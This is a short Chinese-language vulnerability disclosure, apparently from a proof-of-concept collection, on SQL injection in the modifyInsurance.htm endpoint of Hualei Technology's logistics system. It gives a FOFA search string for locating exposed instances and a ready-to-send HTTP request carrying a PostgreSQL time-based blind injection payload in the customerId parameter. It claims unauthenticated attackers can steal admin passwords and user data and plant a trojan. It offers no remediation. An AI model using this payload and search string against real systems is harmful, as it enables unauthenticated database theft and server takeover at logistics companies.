# 华磊科技物流modifyInsurance存在sql注入漏洞

华磊科技物流系统 modifyInsurance.htm等接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```yaml
body="l_c_bar"||body="l_c_center"
```

## poc

```yaml
GET /modifyInsurance.htm?documentCode=1&insuranceValue=1&customerId=1+AND+6269=(SELECT+6269+FROM+PG_SLEEP(5)) HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
```

![9b6950da9ffc45e699c4df8ebcdeae21.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407232010044.png)